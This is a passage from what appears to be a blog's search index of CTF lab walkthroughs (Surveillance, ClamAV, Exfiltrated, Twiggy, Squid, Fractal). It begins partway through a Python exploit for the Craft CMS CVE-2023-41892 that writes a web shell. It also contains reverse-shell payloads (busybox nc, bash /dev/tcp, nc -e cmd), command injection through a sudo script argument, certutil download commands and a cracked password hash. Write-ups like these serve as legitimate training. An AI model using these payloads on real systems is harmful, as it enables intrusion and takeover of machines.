\"conditions/render\",          \"configObject[class]\": \"craft\\\\elements\\\\conditions\\\\ElementCondition\",          \"config\": r'{\"name\":\"configObject\",\"as \":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\", \"__construct()\":{\"methods\":{\"close\":\"phpinfo\"}}}}'      }          response = requests.post(url, headers=headers, data=data)          pattern1 = r'&lt;tr&gt;&lt;td class=\"e\"&gt;upload_tmp_dir&lt;\\/td&gt;&lt;td class=\"v\"&gt;(.*?)&lt;\\/td&gt;&lt;td class=\"v\"&gt;(.*?)&lt;\\/td&gt;&lt;\\/tr&gt;'      pattern2 = r'&lt;tr&gt;&lt;td class=\"e\"&gt;\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]&lt;\\/td&gt;&lt;td class=\"v\"&gt;([^&lt;]+)&lt;\\/td&gt;&lt;\\/tr&gt;'          match1 = re.search(pattern1, response.text, re.DOTALL)      match2 = re.search(pattern2, response.text, re.DOTALL)          if match1 and match2:          return match1.group(1), match2.group(1)      else:          print(\"Error: Could not find upload_tmp_dir or DOCUMENT_ROOT in the response.\")          return None, None      def trigerImagick(tmpDir):      data = {          \"action\": \"conditions/render\",          \"configObject[class]\": \"craft\\\\elements\\\\conditions\\\\ElementCondition\",          \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmpDir + r'/php*\"}}}'      }      response = requests.post(url, headers=headers, data=data)      def shell(cmd):      response = requests.get(url + \"/cpresources/shell.php\", params={\"cmd\": cmd})      match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)          if match:          extracted_text = match.group(1).strip()          print(extracted_text)      else:          return None      return extracted_text      if __name__ == \"__main__\":      if(len(sys.argv) != 2):          print(\"Usage: python CVE-2023-41892.py &lt;url&gt;\")          exit()      else:          url = sys.argv[1]          print(\"[-] Get temporary folder and document root ...\")          upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()          tmpDir = \"/tmp\" if \"no value\" in upload_tmp_dir else upload_tmp_dir          print(\"[-] Write payload to temporary file ...\")          try:              writePayloadToTempFile(documentRoot)          except requests.exceptions.ConnectionError as e:              print(\"[-] Crash the php process and write temp file successfully\")              print(\"[-] Trigger imagick to write shell ...\")          try:              trigerImagick(tmpDir)          except:              pass              print(\"[-] Done, enjoy the shell\")          while True:              cmd = input(\"$ \")              shell(cmd)            python CVE-2023-41892.py http://surveillance.htb      Lateral MovimentAfter entering the machine with www-data I tried to run some commands, but nothing was effective as it was limited.Then I ran lastlog to check which users are active.It is possible to see that there is a user Matthew who logged in last time. Searching for backup filesfind / -name \"*.*bak*\" -or -name \"*.backup*\" 2&gt;/dev/nullI found a folder ~/html/craft/storage/backups      ls -la ~/html/craft/storage/backups      Transferred the file via netcat.nc -lvnp 3340 &lt; surveillance--2023-10-17-202801--v4.4.14.sql.zip nc 10.10.11.245 3340 &gt; surveillance--2023-10-17-202801--v4.4.14.sql.zip      surveillance--2023-10-17-202801--v4.4.14.sql → It is possible to see that it adds a user matthew in the SQL              INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');            cracking the hash on crackstation.net → starcraft122490      Great, now switching to user matthew      su matthew            flag      Priv EscalationZoneMinder 1.36.32Now running linpeas.      linpeas.sh → Identified “ZoneMinder”      ZoneMinder is a free, open-source software application for monitoring via closed-circuit television - developed to run under Linux and FreeBSD and released under the terms of the GNU General Public License (GPL). Users control ZoneMinder via a web-based interface.      dpkg -l | grep zoneminder →      Checking the version of ZoneMinder, I noticed it was v1.36.32.From there, viewing the information on Metasploit, it is possible to see that it is vulnerable      use unix/webapp/zoneminder_lang_execinfo -d      To use this module, I will have to do a manual port forwarding.      ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb      Accessing via web on port 2222.      http://127.0.0.1:2222      None of the previous creds worked. So, I decided to run the module in Metasploit.      use exploit/unix/webapp/zoneminder_snapshots            exploit      The current user can execute any Perl script located in  /usr/bin/ that starts with zm and is followed by any combination of letters from a a z (uppercase or lowercase), without needing a sudo password.      sudo -l      Checking the Perl files that the user has access to      ls -l /usr/bin/zm*.pl      Observing the update file      cat /usr/bin/zmupdate.pl          It is a script intended to check and update the ZoneMinder database. It basically needs a password to run. I can try to send a command with the password obtained by linpeas.      Payload      #!/bin/bash  busybox nc 10.10.16.4 5580 -e sh            sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/reverse.sh)' --pass=ZoneMinderPassword2023      Checking on netcat      nc -lvnp 5580      We got the shell with root."
  },
  
  {
    "title": "Proving Grounds - ClamAV",
    "url": "/posts/Proving-Grounds-ClamAV/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, SNMP, ClamAV-Milter",
    "date": "2024-07-14 00:00:00 -0300",
    





    
    "snippet": "ClamAV was an insightful box to explore exploitation techniques for services like ClamAV-Milter.The process started with comprehensive information gathering, including a full port scan revealing va...",
    "content": "ClamAV was an insightful box to explore exploitation techniques for services like ClamAV-Milter.The process started with comprehensive information gathering, including a full port scan revealing various open ports.The HTTP enumeration led to identifying and decoding a binary message, providing a potential password.Enumeration of SNMP services helped identify the running ClamAV-Milter service.The exploitation phase involved searching for relevant exploits and utilizing a Perl script to create a backdoor by modifying the /etc/inetd.conf file, which enabled root shell access through a netcat connection on a specified port.Diagramgraph TD    A[Information Gathering] --&gt;|Port Scan| B[Enumeration]    B --&gt; C[HTTP 80]    C --&gt; |Find Binary Info| D[Decode Binary]    B --&gt; F[SNMP 199 &amp; 25]    F --&gt; G[Identify ClamAV-Milter]    G --&gt; H[Exploit ClamAV-Milter] --&gt; |Execute Perl Script| I[Root Shell]Information GatheringIP=192.168.184.42Port scan      nmap -sS -Pn -n -T4 --open $IP            nmap -sS -Pn -n -T4 --open -p- $IP - new port 6000            nmap -sVC -Pn -n -p 22,25,80,139,199,445,60000 $IP      EnumerationHTTP 80      http://192.168.184.42/ → Info in binary. Also the title is called Ph33r, looks like an User.            translating binary - ifyoudontpwnmeuran00b -  Looks like an password            feroxbuster -u http://$IP -k -C 404,403,500,502  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100      SNMP 199 &amp; 25      snmpwalk -c public -v1 $IP - Nothing useful            snmp-check $IP -c public          It’s running  ClamAV-Milter3782 runnable clamav-milter /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctlExploitationClamAVNow searching for scripts for ClamAV-Milter      searchsploit ClamAV-Milter → Only in perl            cat 4761.pl      This script exploits a vulnerability in Sendmail when used with ClamAV’s milter to append a malicious command to /etc/inetd.conf, effectively creating a backdoor that grants root access via a shell on a specified TCP port (31337). The script then restarts the inetd service to activate the backdoor.      perl 4761.pl $IP            nc $IP 31337/bin/sh -i            flag      "
  },
  
  {
    "title": "Proving Grounds - Exfiltrated",
    "url": "/posts/Proving-Grounds-Exfiltrated/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Subrion, Exiftool",
    "date": "2024-07-13 00:00:00 -0300",
    





    
    "snippet": "Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.Initial enumeration led ...",
    "content": "Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.Initial enumeration led to the discovery of Subrion CMS, and default credentials allowed for access to the admin panel.By exploiting a file upload vulnerability, a reverse shell was obtained. Further enumeration revealed a cron job running Exiftool on uploaded images, which was leveraged to escalate privileges and capture the flag.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[Identify Subrion CMS]    B --&gt;|Default Credentials| C[Admin Panel Access]    C --&gt;|File Upload Vulnerability| D[Upload Reverse Shell]    D --&gt;|Execute Reverse Shell| E[Gain Initial Access]    E --&gt;|Cron Job Enumeration| F[Identify Exiftool Usage]    F --&gt;|Exploit Exiftool| G[Privilege Escalation]    G --&gt;|Capture Flag| H[Success]Information GatheringPortscan      nmap -sS -Pn -n -T4 --open 192.168.177.163            nmap -sS -Pn -n -T4 --open 192.168.177.163 -p-            nmap -sVC -Pn -n -p 22,80 192.168.177.163      EnumerationHTTP 80      http://192.168.177.163 → redirects to exfiltrated.offsec            cat /etc/hosts            http://exfiltrated.offsec/ → Subrion CMS            http://exfiltrated.offsec/robots.txt            http://exfiltrated.offsec/panel/ → Panel Login. CMS v4.2.1            searchsploit Subrion CMS 4.2.1            Subrion default credentials: admin/admin            http://exfiltrated.offsec/panel/members/add/ → made login              Once authenticated i tried this exploit  https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCEAfter read the exploit i decided to put an reverse shell inside the http://exfiltrated.offsec/panel/uploads/      cat revShell.phar            http://exfiltrated.offsec/panel/uploads/            http://exfiltrated.offsec/uploads/revShell.pharrlwrap nc -lvnp 80      Priv Escalation      cat /etc/cron*            cat /opt/image-exif.sh            ls -lh /opt/image-exif.sh            ls -ld /var/www/html/subrion/uploads /opt/metadata      Since the cron script writes EXIF metadata to a log file in /opt/metadata using the exiftool command, one possible attack vector is to exploit a symlink attack if the script does not properly handle symbolic links.      exiftool -ver            searchsploit exiftool      Searching more i found this repositoryhttps://github.com/mr-tuhin/CVE-2021-22204-exiftool.gitBut wasn’t working because of the bbz      sudo apt-get install imagemagick djvulibre-bin exiftool        python3 exploit.py 192.168.45.194 4430            http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw            http://exfiltrated.offsec/uploads/image.jpgrlwrap nc -lvnp 4430            Flag.txt      "
  },
  
  {
    "title": "Proving Grounds - Twiggy",
    "url": "/posts/Proving-Grounds-Twiggy/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, SaltStack",
    "date": "2024-07-12 00:00:00 -0300",
    





    
    "snippet": "Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.The machine required initial enumeration to identify open services, followed by a specific focus on the web service ...",
    "content": "Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.The machine required initial enumeration to identify open services, followed by a specific focus on the web service running on port 8000.By identifying and leveraging the salt-api service, a known exploit for SaltStack 3000.1 was used to gain access and execute a reverse shell.This machine provided practical experience in handling and exploiting SaltStack configurations.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[Identify SaltStack]    B --&gt;|Web Service on 8000| C[Explore SaltStack API]    C --&gt;|Find Exploit| D[Execute Exploit]    D --&gt;|Gain Access| E[Execute Reverse Shell]    E --&gt;|Obtain Access| F[Privilege Escalation]    F --&gt;|SaltStack Privilege Escalation| G[Capture Evidence]    G --&gt;|Success| H[Completion]Information GatheringPort Scan      nmap -sS -Pn -n -T4 -p- --open 192.168.177.62            nmap -sVC -Pn -n -p 22,53,80,4505,4506,8000 192.168.177.62      EnumerationHTTP 8080      http://192.168.177.62:8000/ → This looks like some clients for the webserver.      So i decided to try access some url’s that are mistaken on purpose.      http://192.168.177.62:8000/local → Powered by CherryPy 5.6.0            feroxbuster -u http://192.168.177.62:8000 -k -C 404,403,500  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100            http://192.168.177.62:8000/login → Says “Please log in”            curl -X POST http://192.168.177.62:8000/login -d \"username=admin&amp;password=admin\" → Unauthorized            Intercepting the login request in the burp                Verifying the response of the requisition      HTTP/1.1 200 OK  Server: nginx/1.16.1  Date: Thu, 04 Jul 2024 20:29:32 GMT  Content-Type: application/json  Content-Length: 43  Connection: close  Access-Control-Expose-Headers: GET, POST  Vary: Accept-Encoding  Allow: GET, HEAD, POST  Access-Control-Allow-Credentials: true  Access-Control-Allow-Origin: *  Www-Authenticate: Session  Set-Cookie: session_id=178a37984d63e3d4ea4a4a39d686e300e2256436; expires=Fri, 05 Jul 2024 06:29:32 GMT; Path=/  X-Upstream: salt-api/3000-1      {\"status\": null, \"return\": \"Please log in\"}          I also can get the same answer with this command:      curl -v -X GET http://192.168.177.62:8000/login      It have the X-Upstream: salt-api/3000-1.ExploitationSalt-APIThat information about the requisition, indicates the request was handled upstream by a service identified as salt-api version 3000-1. This suggests the server might be running SaltStack, a configuration management tool.      Search in the google for salt-api/3000-1 → There’s an exploit for SaltStack 3000.1            https://github.com/jasperla/CVE-2020-11651-poc/tree/master        python3 exploit.py -m 192.168.177.62 -r /etc/shadow      Once that i wanted an reverse shell, this script wasn’t promisor, so i found this one:      https://github.com/bravery9/SaltStack-Exp/tree/master        python3 exp.py --master 192.168.177.62 -lh 192.168.45.227 -lp 80            rlwrap nc -lvnp 80            flag      "
  },
  
  {
    "title": "Proving Grounds - Squid",
    "url": "/posts/Proving-Grounds-Squid/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Windows, Web, Squid, provingrounds",
    "date": "2024-07-11 00:00:00 -0300",
    





    
    "snippet": "Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privil...",
    "content": "Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.The process included using spose to identify internal services, leveraging the proxy to access a WampServer, and ultimately using FullPowers.exe and PrintSpoofer to gain SYSTEM access.This machine was a great way to practice working with proxy configurations and Windows privilege escalation.Diagramgraph TD    A[Host Enumeration]    A --&gt;|Nmap Scan| B[Identify Squid Proxy]    B --&gt;|Explore Proxy Configuration| C[Tool: spose]    C --&gt;|Identify Internal Services| D[Web Service on 8080]    D --&gt;|Access WampServer| E[Identify phpMyAdmin]    E --&gt;|Bypass Authentication| F[Upload PHP Shell]    F --&gt;|Execute Reverse Shell| G[WinPEAS Enumeration]    G --&gt;|Identify Privilege Escalation| H[Leverage FullPowers.exe]    H --&gt;|Enable SeImpersonatePrivilege| I[Use PrintSpoofer]    I --&gt;|Privilege Escalation to SYSTEM| J[Obtain Root Access]    J --&gt;|Capture Evidence| K[Success]Information GatheringPort Scan      nmap -sS -Pn -n -T4 192.168.217.189 -p 135,139,445,3128            nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v      EnumerationHTTP 80      http://192.168.217.189:3128/ → Apparently the website uses squid/4.14      Squid is a caching and forwarding HTTP web proxy. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.This is the squid repo https://github.com/squid-cache/squidI was searching in the GitHub, etc., but nothing worked. So i decided to try this:https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid      curl --proxy http://192.168.217.189:3128 http://192.168.45.227 →  Directory Listening in my own machine      So after a while i decided to try this tool https://github.com/aancw/spose.git      python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227      Ok, verifying if it’s an web page running in 8080      curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080      Now setting up an http proxy with the extension Proxy Switcher https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com      proxy swithcer      And now trying to access it      http://192.168.237.189:8080/ → It’s a WampServer 3.2.3 - 64bit            http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap            http://192.168.237.189:8080/phpmyadmin/index.php → login panel MySQL - tried default creds (root:)          Verifying some documentation about phpMyAdmin…https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f      http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema                http://192.168.237.189:8080/uploader.php      Reverse shell must be for windowshttps://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php  http://192.168.237.189:8080/php_reverse_shell.php      sudo  rlwrap nc -lvnp 80 → Nt authorithy            flag      Priv EscalationThe first thing that i want to do is revoke all firewalls. I’ve tried but the user don’t have permission.So after a while i decided to put winPEAS inside the machine      certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe            winPEASx64.exe → Apparently https://exploit-db.com/exploits/46718 - CVE-2019-0836 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation                  Ok, nothing worked, but after enumerate, and after i saw that i was an nt authority but with “local service’      whoami      I found this https://itm4n.github.io/localservice-privileges/?ref=benheater.com After read the article i found that he did an script https://github.com/itm4n/FullPowers/releases      certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe            FullPowers.exe -c \"C:\\Users\\Public\\Documents\\nc.exe 192.168.45.227 4430 -e cmd\" -zsudo rlwrap nc -lvnp 4430            whoami /priv → Now i’ve SeImpersoantePrivilage enabled      So i’ll use the https://github.com/itm4n/PrintSpoofer/releases      certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe            PrintSpoofer64.exe -i -c cmd → Priv escalado            flag      "
  },
  
  {
    "title": "Proving Grounds - Fractal",
    "url": "/posts/Proving-Grounds-Fractal/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Symfony, MySQL",
    "date": "2024-07-10 00:00:00 -0300",
    





    
    "snippet": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensi...",
    "content": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensitive files and obtaining database credentials.Using these credentials, a Symfony exploit script was executed to achieve Remote Code Execution (RCE) and gain a reverse shell.Privilege escalation involved creating a new user via MySQL, allowing SSH access with elevated privileges, eventually leading to root access.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[HTTP Enumeration]    B --&gt;|Identify Symfony| C[Explore Symfony Profiler]    C --&gt;|Find Sensitive Files| D[Exploit Symfony]    D --&gt;|Obtain Database Credentials| E[Use Symfony Exploit Script]    E --&gt;|RCE| F[Reverse Shell]    F --&gt;|Privilege Escalation| G[Create user via MySQL]    G --&gt;|Create User| H[SSH Access]    H --&gt;|User Benoit| I[Root Access]Information GatheringPort Scan      nmap -sS -Pn -n --open -p- -T4 192.168.192.233            nmap -sVC -p 21,22,80 192.168.192.233      EnumerationHTTP 80      http://192.168.192.233/            http://192.168.192.233/robots.txt → CMS symfony 3.4      I Forced an error to appear      http://192.168.192.233/app_dev.php/randomfile        http://192.168.192.233/app_dev.php/_profiler/empty/search/results?limit=10      https://github.com/symfony/symfony/issues/28002            Profile Token      Accessed as if it were an admin panel.      http://192.168.192.233/app_dev.php/_profiler/c7b124      Checking the branch on GitHub, it is possible to view documentation about upgrading Symfony 3.x, so we might find sensitive files.      https://github.dev/symfony/symfony/tree/3.4      Then I decided to investigate the _profiler to find directories since I tried passing it as a URL and got nothing. I filtered by all these statuses to avoid issues.  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.233/app_dev.php/_profiler/FUZZ -fs 47400,47401,47402,47403,47404,47405,47406,47407,47408,47409,47410,47411,47412,47413,47414,47415,47416,47417,47418,47419,47420,47421,47422,47423,47424,47425,47426,47427,47428,47429,47430,47431,47432,47433,47434,47435,47436,47437,47438,47439,47440,47441,47442,47443,47444,47445,47446,47447,47448,47449,47450,47451,47452,47453,47454,47455,47456,47457,47458,47459,47460,47461,47462,47463,47464,47465,47466,47467,47468,47469,47470,47471,47472,47473,47474,47475,47476,47477,47478,47479,47480,47481,47482,47483,47484,47485,47486,47487,47488,47489,47490,47491,47492,47493,47494,47495,47496,47497,47498,47499Found 2 directories “latest” and “open”Investigating the latest had nothing…Says the file is not readable. So, I will try to read the file found “.yml” on GitHub.      http://192.168.192.233/app_dev.php/_profiler/open            ffuf -u http://192.168.192.233/app_dev.php/_profiler/open?FUZZ=app/config/parameters.yml -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -fs 5522 → Found “file”      Now accessing the URL, I’ve found Database credentials.      http://192.168.192.233/app_dev.php/_profiler/open?file=app/config/parameters.yml      ExploitationSearching a lot, I found the following article https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5  https://raw.githubusercontent.com/ambionics/symfony-exploits/main/secret_fragment_exploit.pyInside it, there is an exploit from a fragment. I tried to enumerate the secret but found nothing.      python3 secret_fragment_exploit.py http://192.168.192.233/_fragment      Then I decided to use the secret found in the database.      python3 secret_fragment_exploit.py 'http://192.168.192.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.192.233/_fragment' --function system --parameters \"id\"      Now accessing the generated URL. I was able to execute commands.      http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=11%2FxvG%2BUpm6nlv7maKqSHFIXdN0BjTshxq568sphXaU%3D            python3 secret_fragment_exploit.py '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--method 2 \\--secret '48a8538e6260789558f0dfe29861c05b' \\--algo 'sha256' \\--internal-url '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--function system \\--parameters \"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.227/80 0&gt;&amp;1'\"        http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A52%253A%2522bash%2B-c%2B%2527bash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252F192.168.45.227%252F80%2B0%253E%25261%2527%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=PC7%2FGws9sawDouQ0AzUn3VpCDiEZhuUcPt01QQOMvx4%3D      rlwrap nc -lvnp 80            local.txt      Priv Escalation      cat /etc/passwd → there is the user benoit      I previously obtained access to database information, let’s check and access it.      netstat -nlpt      I tried to access MySQL with the credentials obtained earlier but failed. Then I looked for cron, kernel version, SSH, etc., but found nothing. So I decided to look at the FTP configuration files.      ls -lah /etc/proftpd            cat sql.conf      Let’s connect to SQL.      mysql -u proftpd -p proftpd : protfpd_with_MYSQL_password →      It seems to have a password for www to access proftpd. FTP authentication through ProFTPDI will create a new password for the user benoit who already exists in the system.In the {md5} base64-encoded format. Therefore, the right way to generate a password for the user benoit is to use the base64-encoded MD5 hash method.  /bin/echo \"{md5}\"/bin/echo -n \"hendrich\" | openssl dgst -binary -md5 | openssl enc -base64      INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}wZjbZseC3NVjPeEobwukRg==', 1000, 1000, '/', '/bin/bash', 0, NOW(), NOW());      Now logging into FTP      ftp 192.168.192.233 benoit:hendrich            ssh-keygen        cp id_rsa.pub authorized_keys  mkdir .ssh      put authorized_keys            ssh -i id_rsa benoit@192.168.192.233            sudo -l → has permission to execute everything. sudo su works            flag      "
  }
  
]

